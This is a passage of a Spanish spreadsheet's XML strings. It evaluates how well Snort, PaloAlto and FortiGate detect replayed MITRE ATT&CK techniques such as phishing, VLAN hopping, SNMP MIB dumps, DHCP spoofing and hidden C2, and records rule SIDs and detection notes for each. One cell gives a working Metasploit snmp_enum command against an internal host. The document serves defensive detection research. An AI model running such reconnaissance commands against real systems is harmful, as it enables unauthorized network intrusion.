        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos con Ataque Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: la alerta con SID 255 no se asocia a ningún flujo y paquete, por lo que para los análisis automáticos no se contabiliza como flujo y mensaje detectado. Sin embargo, en el análisis manual es posible asociar esta alerta al flujo y paquete correspondiente.</t>
    </r>
  </si>
  <si>
    <t>33337, 35287</t>
  </si>
  <si>
    <t>Phishing for Information</t>
  </si>
  <si>
    <t>T1598</t>
  </si>
  <si>
    <t>T1598.003</t>
  </si>
  <si>
    <t>Recogida de información de la víctima mediante ingeniería social</t>
  </si>
  <si>
    <t>SEToolKit</t>
  </si>
  <si>
    <t>T1598.003-Spearphishing_Link_[5].pcapng</t>
  </si>
  <si>
    <t>Detección de macros o plantillas comúnmente usadas para llevar a cabo ataques de Phishing</t>
  </si>
  <si>
    <t>Manual [5] / 4.1.1</t>
  </si>
  <si>
    <t>Manual [5] / C.19</t>
  </si>
  <si>
    <t>Manual [5] / 5.1.3</t>
  </si>
  <si>
    <t>El phishing, en general, puede confundirse con actividad legítima (eso es lo que hace que el ataque tenga éxito). En ese sentido, aunque siempre será un ataque, dependiendo del contexto podrá no distinguirse de una actividad legítima</t>
  </si>
  <si>
    <t>24253, 2043343, 2044076, 2012886</t>
  </si>
  <si>
    <t>24253, 2043343, 2044076</t>
  </si>
  <si>
    <t>2043343, 2044076, 2012886, 15935, 59597, 50447, 24253</t>
  </si>
  <si>
    <t>2043343, 2044076, 15935, 59597, 24253</t>
  </si>
  <si>
    <t>50447, 2012886</t>
  </si>
  <si>
    <t>2043343, 2044076, 2012886, 15935, 59597, 50447, 24253, 2002752, 2002749, 2001117, 2101620, 2025364</t>
  </si>
  <si>
    <t>2002752, 2002749, 2001117, 2101620</t>
  </si>
  <si>
    <t>2043343, 2044076, 2012886, 15935, 59597, 50447, 24253, 2002752, 2002749, 2001117, 210162</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv2 no analiza 1 flujo ICMPv6, lo que causa que en vez de 59 flujos detectados sean 58. Este flujo no es relevante para el ataque, por lo que no influye en los resultados</t>
    </r>
  </si>
  <si>
    <t>9999, 56610</t>
  </si>
  <si>
    <t>Network Boundary Bridging</t>
  </si>
  <si>
    <t>T1599</t>
  </si>
  <si>
    <t>NAT Traversal</t>
  </si>
  <si>
    <t>T1599.001</t>
  </si>
  <si>
    <t>Modificación de políticas de red para permitir tráfico externo a la red  interna</t>
  </si>
  <si>
    <t>iptables</t>
  </si>
  <si>
    <t>T1599-NBB1_[5].pcapng</t>
  </si>
  <si>
    <t>Deteccion por anomalías</t>
  </si>
  <si>
    <t>Equipo intermedio entre red interna de la víctima y el atacante con firewall. El atacante con acceso a este equipo intermedio modifica las reglas del firewall iptables para permitir su tráfico.</t>
  </si>
  <si>
    <t>Manual [5] / 4.4.2</t>
  </si>
  <si>
    <t>Manual [5] / C.20</t>
  </si>
  <si>
    <t>Manual [5] /  5.6.6</t>
  </si>
  <si>
    <t>La modificacion de politicas de red puede ser realizada por un atacante o por un administrador de red</t>
  </si>
  <si>
    <t>2002752, 2002749,1325</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>Ataques colaterales:</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> PaloAlto detecta el establecimiento de dos conexiones SSH, correspondientes a la segunda parte del ataque, despues de cambiar las políticas del firewall. </t>
    </r>
  </si>
  <si>
    <t>Network Address Translation Transversal</t>
  </si>
  <si>
    <t>T1599-NBB2_[5].pcapng</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>Ataques colaterales:</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> PaloAlto detecta el establecimiento de dos conexiones SSH, correspondientes a la segunda parte del ataque, despues de cambiar las políticas del firewall. </t>
    </r>
  </si>
  <si>
    <t>Salto de VLAN</t>
  </si>
  <si>
    <t>T1599-Salto_vlan_[1].pcapng</t>
  </si>
  <si>
    <t>SNMP</t>
  </si>
  <si>
    <t>Detección por anomalías y estudio de topología de red, que detecte posibles vulnerabilidades relacionadas con el etiquetado apilable 802.1Q</t>
  </si>
  <si>
    <t>Manual [1] /  3.2.1</t>
  </si>
  <si>
    <t>Manual [1] / E.4</t>
  </si>
  <si>
    <t>El salto vlan siempre es un ataque</t>
  </si>
  <si>
    <t>2101620, 2002752, 2002749</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: la diferencia en los flujos detectados se debe a la identificación de flujos ARP por parte de tranalyzer y a flujos ICMPv6 no identificados por Snortv2 (no es relevante para el ataque)</t>
    </r>
  </si>
  <si>
    <t>Data from Configuration Repository</t>
  </si>
  <si>
    <t>T1602</t>
  </si>
  <si>
    <t>SNMP (MIB Dump)</t>
  </si>
  <si>
    <t>T1602.001</t>
  </si>
  <si>
    <t>Recogida MIB de un equipamiento</t>
  </si>
  <si>
    <t>T1602.001-MIB_Dump_[2].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte el uso del protocolo SNMP sobre UDP para acceder a la comunidad public, con fin de realizar un volcado total de las tablas</t>
  </si>
  <si>
    <t>Este ataque obtiene informacion de la MIB de un equipo mediante peticiones SNMP. Comando: msfconsole -x "use auxiliary/scanner/snmp/snmp_enum; set RHOSTS 192.168.2.2; run; exit"</t>
  </si>
  <si>
    <t>Manual [2] /  3.1.8.1</t>
  </si>
  <si>
    <t>Manual [5] / C.41</t>
  </si>
  <si>
    <t>Manual [2] / 4.2.1.10</t>
  </si>
  <si>
    <t>La recogida de MIBs haciendo uso de SNMP no siempre es un ataque, puede tratarse de una acción legítima</t>
  </si>
  <si>
    <t>1411, 1417</t>
  </si>
  <si>
    <t>2101411, 1411, 1417</t>
  </si>
  <si>
    <t>2101411, 2101417, 2002752, 2002749, 1411, 1417</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2101411, 2101417</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">, 2002752, 2002749, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>1411, 1417</t>
    </r>
  </si>
  <si>
    <t>34789, 34795</t>
  </si>
  <si>
    <t>snmpv1 -- infrastructure</t>
  </si>
  <si>
    <t>Build Image on Host</t>
  </si>
  <si>
    <t>T1612</t>
  </si>
  <si>
    <t>Creacion y montado de un contenedor con un servidor SSH sobre un equipo previamente vulnerado</t>
  </si>
  <si>
    <t>DockerAPI, SSH</t>
  </si>
  <si>
    <t>T1612-BuildImageOnHostLocal_[5].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte descargas de contenedores mediante Docker API</t>
  </si>
  <si>
    <t>Construir contenedor sobre el equipo víctima para evitar ser detectados.</t>
  </si>
  <si>
    <t>Manual [5] / 4.4.3</t>
  </si>
  <si>
    <t>Manual [5] / C.21</t>
  </si>
  <si>
    <t>Manual [5] /  5.6.7</t>
  </si>
  <si>
    <t>Construir un contenedor en un equipo puede ser realizado por un administrador de red para alguna labor o por un atacante</t>
  </si>
  <si>
    <t>2044770, 2019240</t>
  </si>
  <si>
    <t>2044770, 2019240, 15259, 50447</t>
  </si>
  <si>
    <t>15259, 50447, 2002749, 2044770, 2002822, 2019240</t>
  </si>
  <si>
    <t>86533, 32295, 599805, 656385684, 31914, 52175</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>Ataques colaterales:</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> PaloAlto detecta el establecimiento de dos conexiones SSH y transferencia de archivos maliciosos. Sin embargo, no detecta la construccion de una imágen en el Host</t>
    </r>
  </si>
  <si>
    <t>T1612-BuildImageOnHostNAT_[5].pcapng</t>
  </si>
  <si>
    <t>254, 2013504</t>
  </si>
  <si>
    <t>2001117, 2022218, 2101620, 2002749, 2002752, 2013504, 254</t>
  </si>
  <si>
    <t>apt-get -- managament -- consume big bandwith</t>
  </si>
  <si>
    <t>56101, 54319, 32880, 14984, 9999</t>
  </si>
  <si>
    <t>56101, 54319, 32880, 14984</t>
  </si>
  <si>
    <t>El SID 9999 detecta las URLs correspondientes a la descarga de la imágen mediante docker pero como no lo indica mediante una alerta específica de manera clara, no contará para el análisis de detección. Si tenemos en cuentas las alertas generadas mediante IPS y en Control de Aplicaciones se observa el uso de apt-get consumiendo gran ancho de banda, podemos considerar que el ataque está siendo detectado y se está produciendo una descarga desde docker</t>
  </si>
  <si>
    <t>4</t>
  </si>
  <si>
    <t>Group Policy Discovery</t>
  </si>
  <si>
    <t>T1615</t>
  </si>
  <si>
    <t>Comandos mediante Powershell para obtener información sobre configuraciones de políticas de grupo</t>
  </si>
  <si>
    <t>T1615-Group_Policy_Discovery_[5].pcapng</t>
  </si>
  <si>
    <t>Ejecución de comandos mediante Powershell para comprobar políticas de grupo</t>
  </si>
  <si>
    <t>Manual [5] /  4.6.1</t>
  </si>
  <si>
    <t>Manual [5] / C.22</t>
  </si>
  <si>
    <t>Manual [5] /  5.8.3</t>
  </si>
  <si>
    <t>El descubrimiento de politicas de grupo puede ser realizado por un administrador de red o por un atacante</t>
  </si>
  <si>
    <t>2002749, 2002752, 2101620</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv2 no identifica dos flujos ICMP (no es relevante para el ataque)</t>
    </r>
  </si>
  <si>
    <t>Content Injection</t>
  </si>
  <si>
    <t>T1659</t>
  </si>
  <si>
    <t>Inyección</t>
  </si>
  <si>
    <t>T1659_Inyeccion_[1].pcapng</t>
  </si>
  <si>
    <t xml:space="preserve">Detección por anomalías, paquetes sospechosos de haber sido generados aleatoriamente y sin correlación con las comunicaciones establecidas. </t>
  </si>
  <si>
    <t>Manual [1] /  2.5.1.1.4</t>
  </si>
  <si>
    <t>Manual [1] / E.23</t>
  </si>
  <si>
    <t>Manual [5] /  5.3.6</t>
  </si>
  <si>
    <t>Esta técnica siempre se considera como un ataque</t>
  </si>
  <si>
    <t>399, 2100399, 2002752, 2002749</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv2 no analiza un flujo ICMP, pero no afecta a los resultados</t>
    </r>
  </si>
  <si>
    <t>Realizar una suplantación de identidad DHCP, saturando el servidor DHCP verdadero para que el servidor DHCP del atacante procese las consultas de un usuario. Posteriormente se manipula alguna consulta inyectando contenido malicioso</t>
  </si>
  <si>
    <t>dhcpstarv, Metasploit</t>
  </si>
  <si>
    <t>T1659-Content_Injection_[5].pcapng</t>
  </si>
  <si>
    <t>La detección de esta técnica será más o menos viable dependiendo del objetivo y método del atacante. Si el ataque se realiza en conjunto con protocolos de gestion(DHCP) dificultará la detección. Resultará necesario monitorizar por la distribución a traves del tráfico de red de archivos malware</t>
  </si>
  <si>
    <t>Suplantacion de identidad de DHCP Server para posteriormente inyectar contenido en la víctima con malware</t>
  </si>
  <si>
    <t>Manual [5] /  4.2.3</t>
  </si>
  <si>
    <t>Manual [5] / C.23</t>
  </si>
  <si>
    <t>La inyeccion de contenido en otro equipo siempre se considera como un ataque</t>
  </si>
  <si>
    <t>1917, 2018959, 2035480, 2025644</t>
  </si>
  <si>
    <t>2018959, 2035480, 2025644</t>
  </si>
  <si>
    <t>2018959, 2035480, 2025644, 24303, 1917, 15935</t>
  </si>
  <si>
    <t>24303, 1917, 15935</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">2018959, 2035480, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF57BB8A"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2025644</t>
    </r>
  </si>
  <si>
    <t xml:space="preserve">1917, 15935, 2100527, 2002749, 2101620, 2002752, 2001117, 2101917, 2003595, 2018959, 2101200, 2035480, 2000419, 2025644
</t>
  </si>
  <si>
    <t xml:space="preserve">1917, 15935, 2100527, 2002749, 2101620, 2002752, 2001117, 2101917, 2101200
</t>
  </si>
  <si>
    <t>2018959, 2035480, 2025644, 2003595</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv2 no analiza 4 flujos ICMPv6 ni uno IGMP. No afectan al resultado final, pues no se tratan de flujos con ataque.</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">9999, </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="7"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>54752, 39909, 33515</t>
    </r>
  </si>
  <si>
    <t>54752, 39909, 33515</t>
  </si>
  <si>
    <t>14984, 9999</t>
  </si>
  <si>
    <t>Hide Infrastructure</t>
  </si>
  <si>
    <t>T1665</t>
  </si>
  <si>
    <t>Esconder el servidor C2 utilizando un Proxy</t>
  </si>
  <si>
    <t>Metasploit, HTTP Server</t>
  </si>
  <si>
    <t>T1665-Hide_Infrastructure_[5].pcapng</t>
  </si>
  <si>
    <t>Detección por reglas/anomalías. Resulta importante monitorizar tráfico de red con destino a dominios incluidos en listas negras, conexiones a equpos externos...</t>
  </si>
  <si>
    <t>Esconder el servidor C2 utilizando un proxy</t>
  </si>
  <si>
    <t>Manual [5] / 4.8.5</t>
  </si>
  <si>
    <t>Manual [5] / C.24</t>
  </si>
  <si>
    <t>Manual [5] /  5.11.11</t>
  </si>
  <si>
    <t>Esconder un servidor C2 siempre es un ataque</t>
  </si>
  <si>
    <t>2002752, 2002749, 2101917, 1917, 50447</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">Ataques Colaterales: </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>FortiGate detecta el uso de comandos de forma remota. Sin embargo, este es el medio previo para poder llevar a cabo el ataque principal, el cual no es detectado</t>
    </r>
  </si>
  <si>
    <t>LEYENDA DETECTABLE POR PATRONES</t>
  </si>
  <si>
    <t>LEYENDA SIDs (TP prinicpales y TP colaterales)</t>
  </si>
  <si>
    <t>LEYENDA ATAQUES COLATERALES</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="10"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">True Positive Colateral </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF6AA84F"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>■</t>
    </r>
  </si>
  <si>
    <t>SI [1]</t>
  </si>
  <si>
    <t>No, salvo uso de reglas personalizadas</t>
  </si>
  <si>
    <t>No, salvo circunstancias concretas del ataque</t>
  </si>
  <si>
    <t>No, salvo uso de reglas personalizadas y circunstancias concretas del ataque</t>
  </si>
  <si>
    <t>Si es detectable mediante patrones, pero se añade un matiz que afecta a la detección</t>
  </si>
  <si>
    <t>Para diferenciar aquellos TP que identifican instancias/mensajes/flujos de ataque principal frente a aquellos que identifican instancias/mensajes/flujos de ataques colaterales, éstos últimos se colorearán en verde. Aunque estos SIDs contarán como TP, no se incluirán en los contajes definitivos, pues no capturan el ataque implementado</t>
  </si>
  <si>
    <t>En determinadas técnicas, debido a la necesidad de que los flujos se encuentren completos para el análisis con otros cortafuegos como FortiGate o PaloAlto, el establecimiento de conexión no puede omitirse, lo que causa que Snort genere alertas para fases que no constituyen el ataque como tal</t>
  </si>
  <si>
    <t>Fichero pcap</t>
  </si>
  <si>
    <t>Tipo de tráfico</t>
  </si>
  <si>
    <t>Categoría</t>
  </si>
  <si>
    <t>Tamaño real del tráfico</t>
  </si>
  <si>
    <t>Nº de Flujos</t>
  </si>
  <si>
    <t>Nº de Direcciones Distintas</t>
  </si>
  <si>
    <t>Contiene Flujos Truncados (Sin SYN)</t>
  </si>
  <si>
    <t>smtp-FIX.pcapng</t>
  </si>
  <si>
    <t>REAL</t>
  </si>
  <si>
    <t>1,9 kB</t>
  </si>
  <si>
    <t>2002749</t>
  </si>
  <si>
    <t>http-FIX.pcapng</t>
  </si>
  <si>
    <t>52,7 kB</t>
  </si>
  <si>
    <t>youtube-FIX.pcapng</t>
  </si>
  <si>
    <t>332,7 kB</t>
  </si>
  <si>
    <t>2002749, 2002752, 2101620, 51037</t>
  </si>
  <si>
    <t>01 - DIT (01 - DIT (captura_00001_20240125083640)).pcapng</t>
  </si>
  <si>
    <t>100 MB</t>
  </si>
  <si>
    <t>2001219, 2002910, 2002911, 2003068, 2008120, 2010935, 2010937, 2019102, 2101384, 2101411</t>
  </si>
  <si>
    <t>2001117, 2001219, 2002749, 2002752, 2002910, 2002911, 2003068, 2008120, 2009207, 2010935, 2010937, 2019102, 2100381, 2100384, 2100385, 2100399, 2100402, 2100408, 2100469, 2100472, 2100527, 2100615, 2100650, 2101384, 2101390, 2101411, 2101417, 2101444, 2101917</t>
  </si>
  <si>
    <t>02 - DIT (02 - DIT (captura_00001_20240202080842)).pcapng</t>
  </si>
  <si>
    <t>3,9 MB</t>
  </si>
  <si>
    <t>2101384, 2101411</t>
  </si>
  <si>
    <t>2001117, 2002749, 2002752, 2100381, 2100384, 2100399, 2100402, 2100408, 2100472, 2100527, 2101384, 2101411, 2101417, 2101917</t>
  </si>
  <si>
    <t>03 - DIT (03 - DIT (captura_00002_20240125191218)).pcapng</t>
  </si>
  <si>
    <t>103 MB</t>
  </si>
  <si>
    <t>2019102, 2100366, 2100476, 2101384, 2101411</t>
  </si>
  <si>
    <t>2001117, 2002749, 2002752, 2009582, 2019102, 2100366, 2100381, 2100384, 2100385, 2100399, 2100402, 2100408, 2100469, 2100472, 2100476, 2100527, 2101384, 2101411, 2101417, 2101917</t>
  </si>
  <si>
    <t>04 - DIT (04 - DIT (captura_00003_20240126181602)).pcapng</t>
  </si>
  <si>
    <t>109 MB</t>
  </si>
  <si>
    <t>2019102, 2101384, 2101411</t>
  </si>
  <si>
    <t>2001117, 2002749, 2002752, 2009582, 2019102, 2100381, 2100382, 2100384, 2100385, 2100399, 2100402, 2100404, 2100408, 2100469, 2100472, 2100527, 2101384, 2101411, 2101417, 2101917</t>
  </si>
  <si>
    <t>05 - DIT (05 - DIT (captura_00004_20240128151951)).pcapng</t>
  </si>
  <si>
    <t>107 MB</t>
  </si>
  <si>
    <t>2019102, 2027397, 2101384, 2101411</t>
  </si>
  <si>
    <t>2001117, 2002749, 2002752, 2009582, 2019102, 2027397, 2036751, 2100381, 2100384, 2100399, 2100402, 2100408, 2100469, 2100472, 2100527, 2101384, 2101411, 2101417, 2101917</t>
  </si>
  <si>
    <t>06 - DIT (06 - DIT (captura_00005_20240130061546)).pcapng</t>
  </si>
  <si>
    <t>106 MB</t>
  </si>
  <si>
    <t>2009967, 2019102, 2027397, 2101384, 2101411</t>
  </si>
  <si>
    <t>2001117, 2002749, 2002752, 2008470, 2009205, 2009206, 2009207, 2009208, 2009582, 2009967, 2019102, 2027397, 2100381, 2100384, 2100399, 2100402, 2100408, 2100469, 2100472, 2100527, 2101384, 2101411, 2101417, 2101917</t>
  </si>
  <si>
    <t>07 - DIT (07 - DIT (captura_00006_20240131165021)).pcapng</t>
  </si>
  <si>
    <t>48 MB</t>
  </si>
  <si>
    <t>2001117, 2002749, 2002752, 2008470, 2009206, 2009207, 2009208, 2019102, 2027397, 2100381, 2100384, 2100385, 2100399, 2100402, 2100408, 2100469, 2100472, 2100527, 2101384, 2101411, 2101417, 2101917</t>
  </si>
  <si>
    <t>60GB</t>
  </si>
  <si>
    <t>1010, 1054, 11968, 1201, 1280, 1394, 1411, 1413, 1417, 1418, 1419, 1420, 1421, 1447, 1448, 1616, 1852, 1917, 2003, 2004, 2049, 21492, 2339, 2418, 254, 27899, 28555, 28556, 28557, 29456, 31136, 366, 368, 372, 373, 381, 382, 384, 385, 396, 399, 401, 402, 404, 408, 41978, 42255, 42340, 42944, 449, 451, 453, 566, 579, 613, 649, 650, 853, 882, 895</t>
  </si>
  <si>
    <t>1010, 1054, 11968, 1201, 1280, 1394, 1411, 1413, 1417, 1418, 1419, 1420, 1421, 1447, 1448, 1616, 1852, 1917, 2003, 2004, 2049, 21492, 2339, 2418, 254, 27899, 28555, 28556, 28557, 29456, 31136, 366, 368, 372, 373, 381, 382, 384, 385, 396, 399, 401, 402, 404, 408, 41978, 42255, 42340, 42944, 449, 451, 453, 566, 579, 613, 649, 650, 853, 882, 895, 2001219, 2001330, 2001569, 2001579, 2001581, 2001583, 2001972, 2002911, 2003068, 2008578, 2008581, 2009099, 2010144, 2010935, 2010936, 2010937, 2010938, 2010939, 2011716, 2012296, 2012647, 2012709, 2012710, 2012711, 2012712, 2013479, 2014702, 2015856, 2016149, 2016778, 2018124, 2018585, 2019102, 2019401, 2023640, 2023753, 2024217, 2024297, 2025275, 2025649, 2025650, 2025712, 2025822, 2025992, 2027390, 2027412, 2027413, 2027757, 2029575, 2036252, 2038967, 2038968, 2050281, 2100366, 2100368, 2100369, 2100372, 2100373, 2100537, 2100538, 2100566, 2100579, 2101201, 2101280, 2101411, 2101413, 2101616, 2102003, 2102004, 2102465, 2102466, 2102924</t>
  </si>
  <si>
    <t xml:space="preserve">1010, 1054, 11263, 11968, 1201, 12006, 12065, 12066, 12685, 1280, 13719, 1394, 13974, 14019, 1411, 1413, 1417, 1418, 1419, 1420, 1421, 1447, 1448, 15306, 15362, 15517, 15569, 15850, 1616, 16282, 16510, 16642, 17110, 17152, 17410, 17458, 17494, 18174, 18474, 1852, 18528, 1917, 19786, 19887, 2003, 2004, 20212, 20439, 2049, 20620, 21232, 21492, 21817, 2339, 23493, 23861, 2418, 24303, 24304, 24378, 254, 26317, 26989, 26994, 27611, 27899, 27938, 28039, 28069, 28555, 28556, 28557, 28993, 29456, 29519, 29639, 29957, 31136, 31341, 31399, 31767, 32481, 32757, 32760, 34799, 35180, 35193, 3547, 35527, 36376, 366, 36650, 3679, 368, 372, 373, 37545, 37908, 37909, 38038, 381, 38104, 38124, 382, 38270, 38381, 384, 385, 38575, 38595, 38602, 39488, 396, 399, 39993, 401, 40186, 402, 404, 4060, 408, 41054, 41055, 41056, 41057, 41061, 41063, 41065, 41066, 41067, 41068, 41071, 41072, 41074, 41075, 41077, 41186, 4135, 41379, 41524, 41526, 41742, 41807, 41978, 42016, 42017, 42255, 42340, 42785, 42944, 42946, 43359, 43362, 43755, 43808, 44455, 44484, 44485, 44486, 44487, 44488, 44489, 44679, 449, 451, 453, 45577, 45578, 45941, 46373, 46412, 46533, 46637, 47082, 47725, 47726, 48134, 48321, 48326, 48331, 48894, 49040, 50447, 50633, 51000, 51065, 51127, 51284, 51333, 51344, 51744, 5318, 53375, 566, 5730, 57756, 57878, 579, 59258, 59597, 59606, 613, 649, 650, 6699, 853, 882, 895, 2001219, 2001330, 2001569, 2001579, 2001581, 2001583, 2001972, 2002911, 2003068, 2008578, 2008581, 2009099, 2010144, 2010935, 2010936, 2010937, 2010938, 2010939, 2011716, 2012296, 2012647, 2012709, 2012710, 2012711, 2012712, 2013479, 2014702, 2015856, 2016149, 2016778, 2018124, 2018585, 2019102, 2019401, </t>
  </si>
  <si>
    <t>1010, 1054, 11263, 11968, 12006, 1201, 12065, 12066, 12685, 1280, 13719, 1394, 13974, 14019, 1411, 1413, 1417, 1418, 1419, 1420, 1421, 1447, 1448, 15306, 15362, 15517, 15569, 15850, 1616, 16282, 16510, 16642, 17110, 17152, 17410, 17458, 17494, 18174, 18474, 1852, 18528, 1917, 19786, 19887, 2003, 2004, 20212, 20439, 2049, 20620, 2100254, 2100312, 2100366, 2100368, 2100369, 2100372, 2100373, 2100381, 2100382, 2100384, 2100385, 2100396, 2100399, 2100401, 2100402, 2100404, 2100408, 2100449, 2100451, 2100453, 2100469, 2100485, 2100486, 2100524, 2100527, 2100537, 2100538, 2100566, 2100615, 2100628, 2100649, 2100650, 2101201, 2101280, 2101411, 2101417, 2101418, 2101420, 2101447, 2101448, 2101616, 2101620, 2101917, 2102003, 2102004, 2102049, 2102329, 2102336, 2102418, 2102465, 2102466, 2102924, 2102925, 2000428, 2000537, 2000538, 2000545, 2001117, 2001219, 2001329, 2001330, 2001331, 2001353, 2001384, 2001404, 2001569, 2001581, 2001904, 2001972, 2002749, 2002752, 2002826, 2002911, 2002946, 2002948, 2003006, 2003012, 2003013, 2003020, 2003068, 2003595, 2006408, 2006409, 2007571, 2008230, 2008578, 2008581, 2009099, 2009205, 2009206, 2009207, 2009208, 2009582, 2009583, 2009584, 2009767, 2009768, 2010144, 2010518, 2010706, 2010935, 2010936, 2010937, 2010938, 2010939, 2011016, 2011368, 2011408, 2011411, 2011716, 2011764, 2012296, 2012709, 2012710, 2012711, 2012712, 2013273, 2013479, 2013490, 2013491, 2014384, 2014702, 2016149, 2016662, 2018124, 2018585, 2019102, 2019401, 2021630, 2022218, 2023640, 2023753, 2023997, 2024766, 2025275, 2025649, 2025650, 2025822, 2025992, 2027390, 2027412, 2027413, 2027757, 2027759, 2027768, 2027865, 2030390, 2030555, 2030835, 2031489, 2031490, 2031491, 2034857, 2036252, 2036751, 2038967, 2038968, 2044665, 2044666, 2049956, 2049957, 2051116, 366, 368, 372, 373, 381, 382, 384, 385, 396, 399, 401, 402, 404, 408, 41978, 42016, 42017, 42255, 42340, 42785, 42944, 42946, 43359, 43362, 43755, 43808, 44455, 44484, 44485, 44486, 44487, 44488, 44489, 44679, 449, 451, 453, 45577, 45578, 45941, 46373, 46412, 46533, 46637, 47082, 47725, 47726, 48134, 48321, 48326, 48331, 48894, 49040, 50447, 50633, 51000, 51065, 51127, 51284, 51333, 51344, 51744, 5318, 53375, 566, 5730, 57756, 57878, 579, 59258, 59597, 59606, 613, 649, 650, 6699, 853, 882, 895</t>
  </si>
  <si>
    <t>109010003, 54482, 31993, 56505</t>
  </si>
  <si>
    <t>TOTAL</t>
  </si>
  <si>
    <t>Nº Único de Reglas por Paquete</t>
  </si>
  <si>
    <t>Registros Totales - Valores Absolutos</t>
  </si>
  <si>
    <t>Técnicas que generan Alertas (TP)</t>
  </si>
  <si>
    <t>Ataques que generan Alertas (TP)</t>
  </si>
  <si>
    <t>Registros Totales - Porcentajes Totales</t>
  </si>
  <si>
    <t xml:space="preserve">  </t>
  </si>
  <si>
    <t>Alertas totales TP (attackids)</t>
  </si>
  <si>
    <t>Alertas TP promedio (attackids) por Ataque</t>
  </si>
  <si>
    <t>Registros de Detecciones</t>
  </si>
  <si>
    <t>Snort</t>
  </si>
  <si>
    <t>Efectividad de Alertas</t>
  </si>
  <si>
    <t>LEYENDA PROCEDENCIA DE PCAPS (Manual [n])</t>
  </si>
  <si>
    <t>Referencia</t>
  </si>
  <si>
    <t>Título</t>
  </si>
  <si>
    <t>Autor</t>
  </si>
  <si>
    <t>URL Acceso</t>
  </si>
  <si>
    <t>Seguridad en conmutadores de red y puntos de acceso. Clasificación y realización práctica de ataques</t>
  </si>
  <si>
    <t>Javier García Clavero</t>
  </si>
  <si>
    <t>https://idus.us.es/items/88bc3f70-881a-4b0a-982e-3d60d0a07d65</t>
  </si>
  <si>
